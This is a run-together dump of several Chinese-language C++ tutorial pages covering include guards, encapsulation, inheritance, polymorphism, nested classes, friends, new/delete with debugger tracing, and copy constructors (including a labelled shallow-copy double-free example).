size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125; 编译，报错说没找到printf，那在main.cpp中加上#include &lt;stdio.h&gt; 12345678910111213141516171819202122#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125; 编译通过了。好奇，因为main.cpp中用了size_t，也用到了free，为什么不用#include &lt;stdlib.h&gt;？ **答案：**因为main.cpp中#include &quot;ReadFileToFileBuffer.h&quot;，在ReadFileToFileBuffer.h中已经了#include &lt;stdlib.h&gt;。我们知道include做的是复制粘贴的工作，ReadFileToFileBuffer.h预处理后贴进了stdlib.h的内容，然后main.cpp包含ReadFileToFileBuffer.h，相当于main中也贴进了stdlib.h的内容，实现了“间接”包含。 如果main.cpp也#include &lt;stdlib.h&gt;，编译也能通过。为什么？main包含stdlib.h，然后因为包含ReadFileToFileBuffer.h，不就包含了两次stdlib.h？ 123456789101112131415161718192021222324#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // 显式包含stdlib.h以使用free和size_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125; 原因： #include 指令的确是将指定的文件内容在预处理阶段复制到源文件中。但是，为了防止头文件被重复包含，通常会在头文件中使用预处理器宏来避免这种情况。这就是所谓的“包含卫士”（include guards）。 比如自己写的 file_reader.h 文件，可以使用预处理器宏来防止重复包含： 123456#ifndef FILE_READER_H#define FILE_READER_H// ... 头文件内容 ...#endif // FILE_READER_H 这段代码的作用是检查 FILE_READER_H 是否已经定义。如果没有定义，它会定义 FILE_READER_H，并允许头文件的内容被包含。如果 FILE_READER_H 已经定义了（表示头文件已经被包含过），则预处理器会跳过这个头文件的内容，防止它被包含第二次。 因此，即使 &lt;stdlib.h&gt; 在 main.c 中被包含了两次（一次是直接包含，一次是通过 file_reader.h 间接包含），实际上它的内容只会被包含一次，因为标准库的头文件也使用了类似的包含卫士来防止重复包含。 这就是为什么在 main.c 中再次包含 &lt;stdlib.h&gt; 不会导致问题的原因。这样做是为了确保 main.c 对 &lt;stdlib.h&gt; 中定义的功能的依赖是明确的，即使 file_reader.h 未来改变了它的包含策略，main.c 仍然能够正常编译。 12345678910111213141516/****stdlib.h - declarations/definitions for commonly used library functions****/#if _MSC_VER &gt; 1000#pragma once#endif#ifndef _INC_STDLIB#define _INC_STDLIB#if !defined(_WIN32) &amp;&amp; !defined(_MAC)#error ERROR: Only Mac or Win32 targets supported!#endif//... 小结 那么在main.c中，最好的方式还是#include &lt;stdlib.h&gt;。每个源文件中显式包含它们所需的所有头文件。这样做可以确保源文件的依赖关系清晰，且不依赖于其他头文件的包含情况，使得每个文件都是自包含的。 123456789101112131415161718192021222324#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // 显式包含stdlib.h以使用free和size_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125;"},{"title":"OOP三大特征","path":"/wiki/C++/OOP三大特征.html","content":"前言 物件導向程式設計（英語：Object-oriented programming，缩写：OOP），国内翻译是面向对象 前面讲过了继承，封装，多态的语法要求，本小节讲下设计层面的内容。 语法要求：写错就编译不过去，新手很快就能学会 设计层面：要有大量coding经验才能体会和提升设计层面的理念 封装 目的：实现数据隐藏 为什么要隐藏数据成员？根本目的是可控 例 成员作为public，语法上是合法的，但会不可控，可能会出现Age=-1，出现不合理的现象 语法ok但设计不好可控123456789101112131415class Person&#123;public: int age; int sex;&#125;;int main()&#123; Person p; p.age = -1; // 语法上合法，但逻辑上不合理，年龄不可能为负 p.sex = 2; return 0;&#125;通过public的接口访问私有成员，在接口中做到对数据的可控 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;class Person&#123;private: int age; int sex;public: void SetAge(int age) //通过public的接口来访问私有成员 &#123; if(age&lt;0) //达到可控的目的 &#123; printf(&quot;invalid_argument &quot;); &#125; else &#123; this-&gt;age=age; &#125; &#125;&#125;;int main()&#123; Person p; p.SetAge(2); return 0;&#125; 继承 继承：子类从父类继承成员变量和成员函数 好处：不用重复造轮子，相同的代码不用写两遍 多态 讲多态必须先从OOP语言设计思想上说起。OOP语言发明时的设计思想之一是减少重复代码的编写，术语叫提高代码复用。代码复用有两种方式，一种是前边的继承，Derived类通过继承，继承了Base类的数据（变量和函数），来达到减少相同代码的编写。还有一种是共用相同的函数，来看一个例子。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125; void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; Derived(int x, int y, int z) : Base(x, y) &#123; this-&gt;z = z; &#125; void Print() //override &#123; Base::Print(); //代码复用，Base类写过了，调用，而不再写一次 printf(&quot;%d &quot;, this-&gt;z); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;void PrintDerived(Derived&amp; d)&#123; d.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); Derived d(1, 2, 3); PrintDerived(d); return 0;&#125; PrintBase函数：用于打印Base类对象的成员 PrintDerived函数：用于打印Dervired类对象的成员 PrintBase函数和PrintDerived函数看着就像是相同的轮子，也是重复代码。 1234void PrintBase(Base&amp; b)&#123; b.Print();&#125; 1234void PrintDerived(Derived&amp; d)&#123; d.Print();&#125; 如何合并？来减少相同代码的重复编写。C++有upcasting，一个Derived类对象的指针/引用可以交给Base类型的指针/引用。从内存布局上来说，这是安全的： 父类成员在子类成员前面 子类成员是父类成员的超集，父类指针/引用访问不会访问越界 于是上面代码变成： 1234567891011121314151617void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); printf(&quot; &quot;); Derived d(1, 2, 3); PrintBase(d); //upcasting return 0;&#125; 但问题来了，传Derived类对象时调用的仍是Base类的Print函数，而不是Derived类的Print。也就是说，PrintBase()函数接收对象后，调用的都是Base::Print函数，而不是会根据对象类型动态变化： 传Base对象，调用Base的Print 传Derived对象，调用Derived的Print 要想实现的话，需要在Base类中的Print函数前加上virtual关键字 12345678910111213141516171819class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;- void Print()+ virtual void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125; virtual void Print() &#123; printf(&quot;%d %d &quot;, this-&gt;x, this-&gt;y); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; Derived(int x, int y, int z) : Base(x, y) &#123; this-&gt;z = z; &#125; void Print() //override &#123; Base::Print(); //代码复用，Base类写过了，调用，而不再写一次 printf(&quot;%d &quot;, this-&gt;z); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b(1, 2); PrintBase(b); printf(&quot; &quot;); Derived d(1, 2, 3); PrintBase(d); //upcasting return 0;&#125; 到这里就可以引出多态的概念了 多态是OOP语言三大特性之一。多态：相同的接口，会根据传入对象的具体类型而产生不同的行为。C++通过虚函数来实现多态。 相同的接口：在上面的例子中，Derived的打印函数也要是void Print()，要和Base类打印函数一样，因为要统一的接口 PrintBase()函数，通过父类的引用，根据传入对象的具体类型而表现那个对象的行为。 未加virtual关键字，是普通的成员函数，早绑定（early binding）；加virtual后，表示是虚函数，晚绑定（late binding） 关于虚函数的底层实现，后面的文章讲 相关概念 纯虚函数 如果Base类的虚函数没有具体实现的意义，只是为了给子类定义一个统一的接口，那么可以定义成纯虚函数（pure virtual function）。 语法格式 将成员函数声明为virtual 该函数没有函数体（后跟=0） 语法格式1virtual &lt;返回类型&gt; &lt;函数名&gt;(参数列表) = 0; 好处：子类必须重写这个虚函数，编译器会帮忙检查 虚函数可以被直接调用，也可以被子类重写后以多态的形式调用 纯虚函数必须在子类中实现该函数才可以使用 抽象类 含有纯虚函数的类被称为抽象类（abstract class） 抽象类中也可以包含普通的函数 抽象类不能实例化（创建对象）， 纯虚函数和抽象类的语法很简单，几句话就说完了，但我们需要站在更高的角度去理解 抽象类的意义 抽象类为子类定义标准，定义规范，具体实现由子类实现。好处：由于子类拥有共同的标准，规范，行为，就便于管理和统计。 比如，淘宝，有很多店铺，虽然每个店铺卖的东西都不一样，但是他们同样具有商品展示、下单、评论、购物车等功能，也就是说他们都遵守了相同的标准和规则；具体的实现交给开淘宝店的人（子类）去根据自己的情况来实现。 例 抽象类CBank定义了一个纯虚函数，该虚函数功能是返回年利率。CICBBank和CCCBank继承了CBank类并实现了虚函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//抽象类：抽象类看成是一个标准，任何该类的子类都必须遵守的标准class CBank&#123;public: virtual double GetAnnualRate() = 0; // pure virturl function&#125;;//中国工商银行class CICBBank : public CBank&#123;private: double m_dPrincipal;public: CICBBank(double dPrincipal) //存入的本金 &#123; m_dPrincipal = dPrincipal; &#125; double GetAnnualRate() //年利率 &#123; return 0.1; &#125; double GetTotalMoney() //目前总资产：本金+本金*年利润 &#123; return m_dPrincipal + m_dPrincipal * GetAnnualRate(); &#125;&#125;;//中国建设银行class CCCBank : public CBank&#123;private: double m_dPrincipal;public: CCCBank(double dPrincipal) &#123; m_dPrincipal = dPrincipal; &#125; double GetAnnualRate() &#123; return 0.2; &#125; double GetTotalMoney() &#123; return m_dPrincipal + m_dPrincipal * GetAnnualRate(); &#125;&#125;;void ShowAnnualRate(CBank* pBank[],DWORD nLength) //统计所有银行的利率&#123; for(int i=0;i&lt;nLength;i++) &#123; printf(&quot;%2lf &quot;,pBank[i]-&gt;GetAnnualRate()); &#125;&#125;int main()&#123; CICBBank icbc(10000); double dMoney1=icbc.GetTotalMoney(); CICBBank ccb(10000); double dMoney2=ccb.GetTotalMoney(); CBank* pBank[]=&#123;&amp;icbc,&amp;ccb&#125;; ShowAnnualRate(pBank,2); return 0;&#125; 即使CICBBank和CCCBank不继承CBank类，也能完成各自完成总资产：本金+本金*年利润的功能。但它们有了统一的抽象类后，当我们需要统计管理时就很方便，因为它们都是从CBank类派生，当需要统计各银行的年利率时就可以很方便的统计出： 1234567891011121314151617void ShowAnnualRate(CBank* pBank[],DWORD nLength) //统计所有银行的利率&#123; for(int i=0;i&lt;nLength;i++) &#123; printf(&quot;%2lf &quot;,pBank[i]-&gt;GetAnnualRate()); &#125;&#125;int main()&#123; //...... CBank* pBank[]=&#123;&amp;icbc,&amp;ccb&#125;; ShowAnnualRate(pBank,2); return 0;&#125;"},{"title":"内部类（嵌套类）","path":"/wiki/C++/内部类（嵌套类）.html","content":"内部类（也称为嵌套类）：一个类定义在另一个类的内部。 语法格式 内部类直接在外部类写全内部类的声明和定义分开123456789101112class OuterClass &#123;public: // 声明内部类 class InnerClass &#123; public: void display() &#123;&#125; &#125;; &#125;;还可以进一步将函数的声明和实现分开 12345678910111213class OuterClass &#123;public: class InnerClass; // 声明内部类&#125;;// 在外部类外部定义内部类class OuterClass::InnerClass &#123;public: void display() &#123;&#125;&#125;;// End内部类 外部类限定了内部类类名的作用域范围，所以在外部类以外实例化内部类对象需要使用类::内部类 对象名 大小 内部类的存在不会影响外部类的大小。 外部类的大小取决于其成员变量的大小和数量，如果外部类的实例中包含内部类的对象作为其成员变量，那么外部类对象的大小才会增加。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;class OuterClass &#123;private: int outerData;public: // 声明内部类 class InnerClass &#123; private: int innerData; &#125;; // End内部类&#125;;int main() &#123; printf(&quot;Size of OuterClass: %lu &quot;, sizeof(OuterClass)); //输出是4 return 0;&#125; 外部类和内部类的关系 内部类可以访问外部类的所有成员（包括私有成员），因为它在外部类的作用域内。 外部类无法直接访问内部类的成员。要访问这些成员，需要通过内部类public的接口。 其实就是内部类是外部类的友元 内部类+访问控制说明符 内部类可以定义在外部类的public、protected或private区域。 如果定义在public区域，那么外部的其他类也可以访问到内部类，要通过外部类名::内部类名来定义内部类的对象 如果定义在private区域，那么只有外部类自己可以使用这个内部类，这对于隐藏实现细节非常有用。 public内部类 private内部类 在外部类中访问内部类 √ √ 在外部类类外面，比如main中访问内部类 √ × 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;class OuterClass &#123;public: //public的内部类 class PublicInnerClass &#123; public: void display() &#123; printf(&quot;Public内部类 &quot;); &#125; &#125;; // End内部类private: //private的内部类 class PrivateInnerClass &#123; public: void display() &#123; printf(&quot;Private内部类 &quot;); &#125; &#125;; // End内部类public: void usePrivateInner() &#123; PrivateInnerClass inner; inner.display(); // 在OuterClass内部使用private的内部类,ok &#125;&#125;;int main() &#123; OuterClass::PublicInnerClass publicInner; //在OuterClass类外部访问public的内部类,ok publicInner.display(); // OuterClass::PrivateInnerClass privateInner; //在OuterClass类外部访问private的内部类,error，编译错误 return 0;&#125; 内部类存在的目的 用于实现OOP的封装，实现数据隐藏。当一个模块只有这个类会用到，就把这个类定义成内部类，甚至如果只有外部类中的某个成员函数会用到，可以将内部类定义在这个成员函数中。 内部类还可以访问外部类的私有成员，这对于实现某些设计模式（如Builder或Factory模式）非常有用。 小结 内部类只不过是一个定义在外部类的定义域中的普通类"},{"title":"友元","path":"/wiki/C++/友元.html","content":"前言 前面讲过OOP设计的设计思想之一，封装，通过访问控制符对数据进行隐藏，外部想要访问这些数据需要通过接口来访问，通过接口开发者可以达到对数据的控制。但C++有一种机制，友元（朋友 元素），破坏了这种封装性。本小节目的在于说明友元是什么，但是未来在开发中不建议进行使用。 在C++之后出现的其他OOP语言便废弃了友元这种特征，如Java，C# 友元函数 在之前的学习中，我们知道外部是不能直接访问类中的private数据，只能通过类提供的接口进行访问。但友元可以，在Person类中添加一行，告诉编译器void Print(const Person &amp;refPer)是我的朋友，于是类外的函数Print就能直接访问Person类中的私有成员 语法格式1friend 返回类型 函数名(参数列表) 正常情况加上友元函数12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Person&#123;private: int x; int y;public: Person(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;void Print(const Person &amp;refPer)&#123; printf(&quot;%d &quot;, refPer.x); //编译报错，无法访问Person类的private成员 printf(&quot;%d &quot;, refPer.y); //需要通过Person类提供的接口进行访问&#125;int main(int argc, char *argv[])&#123; Person p(1, 2); Print(p); return 0;&#125;123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class Person&#123; //声明友元函数 friend void Print(const Person&amp; refPer);\t//放哪都行，放private、public下都行 private: int x; int y;public: Person(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;void Print(const Person &amp;refPer)&#123; printf(&quot;%d &quot;, refPer.x); //编译通过 printf(&quot;%d &quot;, refPer.y); //能直接访问Person类的私有成员了&#125;int main(int argc, char *argv[])&#123; Person p(1, 2); Print(p); return 0;&#125; 猜测Cpp发明友元的原因：Cpp发明时，已存在大量面向过程的C代码，像void Print(const Person &amp;refPer)这样的代码有很多。如果要按OOP封装的思想，Print这样的函数就行不通了，需要给类增加供外部访问的接口，工作量太大。为了兼容已存在的代码，Cpp做了妥协，提供了友元这一机制，绕过类的访问限制，那么维护旧代码时就只要在类中加上友元的声明，老代码就能用了 什么情况下需要友元函数： 运算符重载的某些场合需要使用友元 两个类要共享数据的时候 友元函数和类的成员函数的区别： 成员函数有this指针，而友元函数没有this指针 友元函数是不能被继承的，就像父亲的朋友未必是儿子的朋友 友元类 加强版的垃圾：友元类。 在MyObject类中声明TestFriend是我的朋友，于是在TestFriend类中就可以直接访问MyObject类中的私有成员。 但注意的是，这种访问是单向的，TestFriend可以访问CObject，但反之则不行。 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;class MyObject&#123; friend class TestFriend; //友元类声明private: int x;public: MyObject() &#123;&#125; MyObject(int x) &#123; this-&gt;x = x; &#125;&#125;;class TestFriend&#123;public: void Fun(MyObject *c) &#123; printf(&quot;%d &quot;, c-&gt;x); //ok &#125;&#125;;"},{"title":"在堆中创建对象","path":"/wiki/C++/在堆中创建对象.html","content":"前言 我们可以在什么地方创建对象？ 全局变量区 在函数外面创建的对象 1Person p; 栈 函数中创建的对象 1234void Max()&#123; Person p;&#125; 堆 在堆中创建的对象 new/delete语法 C++关键字，new/delete用于创建/销毁在堆中的对象 12int *p = new int; // 没赋初值int *p1 = new int(5); // 初始化为5 在堆中创建对象 123Person *p = new Person; // 用无参构造函数Person *p2 = new Person(); // 用无参构造函数Person *p2 = new Person(1, 2); // 用有参构造函数 释放对象占用的空间 1delete p; new和delete的执行流程 代码123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;struct Person&#123; int x; int y; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int x, int y) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;x = x; this-&gt;y = y; &#125; ~Person() &#123; printf(&quot;Destructor called... &quot;); &#125;&#125;;int main()&#123; Person* p = new Person(); delete p; return 0;&#125; 调试时找关键call的技巧1int* pi = (int*)malloc(sizeof(int)*1); 步进malloc，假设malloc里有很多call，有些call是做一些辅助的事情，如何找到真正分配内存的关键call？12345678;...;call A;...;call B;...;call C;...;call D方法：在C语言层级让这条语句执行，看到pi的值是0x3723B0h。于是重新调试，内存窗口定位到0x3723B0h，步进malloc，步过call A，观察内存窗口的值是否有变化如果有，说明call A是关键call如果没有，说明call A不是关键call，那接着试call B直到试出执行某个call后内存窗口数据有变化的就是关键call只是以这个为例子，因为每次重新调试分配的内存地址可能会变 步进new里看执行流程： 123456789//第一步new-&gt; -&gt;_nh_malloc -&gt;_nh_malloc_dbg -&gt;_heap_alloc_dbg -&gt;_heap_alloc_base -&gt;HeapAlloc（不是当前exe的了，是windows的模块提供的）//第二步调用构造函数 new_nh_malloc_nh_malloc_dbg_heap_alloc_dbg_heap_alloc_baseHeapAlloc new 构造函数 （硬编码我这里没显示），最后是个FF间接call，0042d1d8这个地址存的是动态库里一个函数的地址。0042d1d8这个地址在IAT表里 同理，步进delete看执行流程： 1234567//第一步调用析构函数//第二步delete-&gt; -&gt;_free_dbg -&gt;_free_base -&gt;HeapFree（不是当前exe的了，是windows的模块提供的） 之前在C语言学过malloc和free，跟进看下它们的执行流程 malloc的： 12345malloc -&gt;_nh_malloc_dbg -&gt;_heap_alloc_dbg -&gt;_heap_alloc_base -&gt;HeapAlloc free的： 1234free -&gt;_free_dbg -&gt;_free_base -&gt;HeapFree 小结 12345678910111213malloc:\tmalloc-&gt;_nh_malloc_dbg-&gt;_heap_alloc_dbg-&gt;_heap_alloc_base-&gt;HeapAlloc new:1、\t_nh_malloc-&gt;_nh_malloc_dbg-&gt;_heap_alloc_dbg-&gt;_heap_alloc_base-&gt;HeapAlloc2、 构造函数----------------------------------------------------------------------------free: free-&gt;_free_dbg-&gt;_free_base-&gt;HeapFreedelete:1、调用析构函数2、_free_dbg-&gt;_free_base-&gt;HeapFree malloc不会调用构造函数，free不会调用析构函数 new=malloc+构造函数 群里看到的，mark，未来解决，new调用malloc，malloc调用heapalloc，heapalloc调用virtualalloc，virtualalloc调用nt系统进内核 new[]/delete[] 分别用C和C++的方式在堆中申请int类型的数组： 1234567// C方式，用malloc申请，free释放int* p = (int*)malloc(sizeof(int) * 10);free(p);// C++方式，用new[]申请，delete[]释放int* p = new int[10];delete[] p; 分别用C和C++的方式在堆中申请Class类型的数组： 1234567// C方式，用malloc申请，free释放int* p = (Person*)malloc(sizeof(Person) * 10);free(p);// C++方式，用new[]申请，delete[]释放Person* p = new Person[10];delete[] p; new[]会调用构造函数，每创建一个对象就调用一次 delete[]会为每一个要销毁的对象都调用析构函数 delete和delete[] 使用new[]申请的对象，却用delete释放 123Person* p = new Person[10];delete p; //只会释放第一个对象，其他的不会释放 完整代码123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;struct Person&#123; int x; int y; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int x, int y) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;x = x; this-&gt;y = y; &#125; ~Person() &#123; printf(&quot;Destructor called... &quot;); &#125;&#125;;int main()&#123; Person* p = new Person[10]; delete p; //只会释放第一个对象，其他的不会释放 return 0;&#125;"},{"title":"对象拷贝-拷贝构造函数","path":"/wiki/C++/对象拷贝-拷贝构造函数.html","content":"前言 对象拷贝指的是创建一个新对象，使其成为某个已存在对象的副本。有两种方式来实现对象拷贝：拷贝构造函数（Copy Constructor），和，重载赋值运算符(=)。本小节讲解拷贝构造函数。 语法形式 函数声明是固定的，如下 1ClassName(const ClassName&amp; other); ClassName是类名，other 是另一个同类型的对象的引用 例 编译器会自动为一个类生成拷贝构造函数，即默认拷贝构造函数（default copy constructor）替开发者写好了对象拷贝的代码。 简单对象-拷贝构造函数有父类的对象-拷贝构造函数执行后，b2、b3是b1对象的拷贝。 1234567891011121314151617181920212223class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;int main()&#123; Base b1(1); // Base parameterized constructor called here Base b2 = b1; // 在栈中的对象 // Base copy constructor called here Base *b3 = new Base(b1); // 在堆中的对象 // Base copy constructor called here // ... 使用 b2 和 b3 ... // 注意：创建在堆上的对象需要手动删除 delete b3;&#125; 拷贝构造函数是对整个对象的复制，包括从父类继承下来的成员。 1234567891011121314151617181920212223242526272829303132class Base&#123;private: int x;public: Base(int x) : x(x) &#123;&#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x), y(y) &#123;&#125;&#125;;int main()&#123; Derived d1(1, 2); // Derived parameterized constructor called here Derived d2 = d1; // 在栈中的对象 // Derived copy constructor called here Derived *d3 = new Derived(d1); // 在堆中的对象 // Derived copy constructor called here // ... 使用 d2 和 d3 ... // 注意：创建在堆上的对象需要手动删除 delete d3;&#125; 浅拷贝和深拷贝 通常情况下编译器替我们生成的默认拷贝构造函数（default copy constructor）就能出色地完成对象的拷贝工作了，但默认拷贝构造函数（default copy constructor）是有缺点的，它是浅拷贝（Shallow Copy）。 当类中含有指针成员时，浅拷贝意味着只复制指针的值，而不复制指针所指向的数据。这可能导致两个对象的指针成员都指向同一个内存地址，从而引发问题，如果一个对象被销毁并释放了其指针指向的内存，另一个对象还持有同一个地址的指针，这会导致悬挂指针或双重删除等问题。 例 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;cstring&gt;#include &lt;cstdio&gt; // 包含用于 printfclass String &#123;public: char* str; // 指针成员 int length; // 基本数据类型成员 // 构造函数 String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //指针成员指向了申请的内存 strcpy(this-&gt;str, str); &#125; // 默认的拷贝构造函数是浅拷贝 // 析构函数 ~String() &#123; delete[] str; //析构中释放申请的内存 printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(String s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length); &#125;int main() &#123; String s1(&quot;hello&quot;); &#123; String s2 = s1; // 使用默认的拷贝构造函数 printString(s2); &#125; // s2 在这里被销毁 // 此时，s1.str 指向的内存已被释放，但 s1 仍然尝试访问它 printString(s1); // 这可能会导致未定义行为，比如崩溃&#125; // s2 在这里被销毁，对一块已释放的内存又delete一次 可以看到默认拷贝构造函数只是将s1对象的成员变量str和length的值拷贝了一份，并没有将s1.str指向的那块内存的内容也拷贝一份。浅拷贝导致现在出现了问题：s2.str指向了同一块内存。 如果我们想实现对指针所指向数据的复制，即深拷贝（Deep Copy），就需要自己写拷贝构造函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstring&gt;#include &lt;cstdio&gt; // 包含用于 printfclass String &#123;public: char* str; // 指针成员 int length; // 基本数据类型成员 // 构造函数 String(const char* str) &#123; this-&gt;length = strlen(str); this-&gt;str = new char[this-&gt;length + 1]; //指针成员指向了申请的内存 strcpy(this-&gt;str, str); &#125; // 深拷贝的拷贝构造函数 String(const String&amp; other) &#123; length = other.length; str = new char[length + 1]; //申请一块新的内存 strcpy(str, other.str); //将other对象中那块内存的内容拷过来 &#125; // 析构函数 ~String() &#123; delete[] str; printf(&quot;String destroyed. &quot;); &#125;&#125;;void printString(const String&amp; s) &#123; printf(&quot;String: %s, Length: %d &quot;, s.str, s.length);&#125;int main() &#123; String s1(&quot;hello&quot;); &#123; String s2 = s1; // 调用深拷贝的拷贝构造函数 printString(s2); &#125; // s2 在这里被销毁，但不会影响 s1 // s1 安全使用 printString(s1);&#125; s2.str指向的是新的内存地址，且那块内存里的内容也和s1一样 子类拷贝构造函数写法 在初始化列表中调用父类的拷贝构造函数 12345// 派生类的拷贝构造函数Derived(const Derived&amp; other) : Base(other), derivedValue(other.derivedValue) &#123; printf(&quot;Derived copy constructor called &quot;);&#125; 调用Derived拷贝构造函数时，会将other对象交给Base&amp;（upcasting，派生类到基类的隐式类型转换，每个Derived对象也都是一个Base对象，这是安全的），由Base的拷贝构造函数完成处理和复制Base部分的成员，派生类特有的成员则由派生类的拷贝构造函数处理。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;cstdio&gt;class Base &#123;public: int baseValue; // 基类的构造函数 Base(int value) : baseValue(value) &#123;&#125; // 基类的拷贝构造函数 Base(const Base&amp; other) : baseValue(other.baseValue) &#123; printf(&quot;Base copy constructor called &quot;); &#125;&#125;;class Derived : public Base &#123;public: int derivedValue; // 派生类的构造函数 Derived(int baseValue, int derivedValue) : Base(baseValue), derivedValue(derivedValue) &#123;&#125; // 派生类的拷贝构造函数 Derived(const Derived&amp; other) : Base(other), derivedValue(other.derivedValue) &#123; printf(&quot;Derived copy constructor called &quot;); &#125;&#125;;int main() &#123; Derived original(10, 20); Derived copy = original; // 这将调用派生类的拷贝构造函数 printf(&quot;Original: baseValue = %d, derivedValue = %d &quot;, original.baseValue, original.derivedValue); printf(&quot;Copy: baseValue = %d, derivedValue = %d &quot;, copy.baseValue, copy.derivedValue); return 0;&#125; 小结 如果不需要深拷贝，使用编译器自动生成的默认拷贝构造函数即可 如果类中含有指针成员，那就必须要自己实现拷贝构造函数，因为默认拷贝构造函数是浅拷贝，无法去做申请一块内存这种复杂动作 注：如果自己添加了拷贝构造函数，所有成员的拷贝就要自己来处理"},{"title":"多态","path":"/wiki/C++/多态.html","content":"绑定（binding） 绑定：函数调用处与函数地址关联起来的过程 例 下面代码中void TestBound(Base* pb)函数的运行结果是什么？ x的输出是多少？ 调用的是哪个Function_1() 调用的是哪个Function_2() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;class Base &#123; public: int x;public: Base() &#123; x = 1; &#125; void Function_1() &#123; printf(&quot;Base::Function_1 called... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called...virtual &quot;); &#125; &#125;; class Sub:public Base &#123; public: int x; public: Sub() &#123; x = 2; &#125; void Function_1() &#123; printf(&quot;Sub::Function_1 called... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Sub::Function_2 called...virtual &quot;); &#125; &#125;; void TestBound(Base* pb) &#123; int n = pb-&gt;x; printf(&quot;%d &quot;,n); pb-&gt;Function_1(); //函数调用 pb-&gt;Function_2(); //函数调用 &#125; int main(int argc, char* argv[]) &#123; return 0; &#125; 回到前面提的，绑定的过程就是函数调用处和函数地址相关联的过程。 函数地址在程序编译时便能确定的，称为编译期绑定，又称前期绑定/早绑定(early binding) 函数地址在函数调用时才能确定的，称为运行期绑定，又称动态绑定/晚绑定(late binding) 观察TestBound函数的反汇编代码 观察到： x已经关联完了，this指针+4，就是父类的x，x写死了的（函数的参数是父类的指针，无论传入的是父类对象还是子类对象，从对象内存布局上看，this+4就是父类的x） pb-&gt;Function_1();，关联的就是父类的function1（Base::Function_1） 调对象虚表中的虚函数地址。但没法确定函数地址，因为传给TestBound函数的可以是父类对象，也可以是子类对象（传子类就是upcasting），传的对象不同，虚表就不同，虚表中的虚函数地址就不同。这里的绑定需要在程序运行时才能确定 答案： TestBound传Base对象和Sub对象，不同情况时的输出如下表 Base对象 Sub对象 x的输出 1 1 Function_1() Base::Function_1 called… Base::Function_1 called… Function_2() Base::Function_2 called…virtual 